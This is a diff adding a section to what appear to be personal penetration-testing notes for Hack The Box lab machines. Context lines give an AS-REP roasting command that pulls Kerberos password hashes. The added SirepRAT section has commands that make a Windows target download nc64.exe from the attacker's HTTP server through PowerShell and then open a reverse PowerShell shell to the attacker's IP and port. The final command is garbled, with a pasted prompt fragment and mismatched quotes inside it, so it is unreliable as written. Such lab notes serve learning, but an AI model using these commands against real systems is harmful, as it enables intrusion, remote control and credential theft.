@@ -207,6 +207,17 @@ Password Protected SSH Private Key:
 		- After getting usernames, if kerberos is running on port 88, then you might be able to get password hashes by running this
 			- python3 GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 			
+			
+	- SirepRAT:
+		- Download: git clond https://github.com/SafeBreach-Labs/SirepRAT
+		- cd SirepRAT
+		- install requeriments as explained in the github page.
+		- "Donwload nc64.exe into this dierctory"
+		- start python SimpleHTTPServer
+		- Upload nc64.exe: python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -outfile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -uri 10.10.14.169/nc64.exe" --v
+		- Start listening to a port for example 1234
+			- python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\> python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe"" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.16.7 1234 -e powershell.exe" --v
+			
 
 		
 		
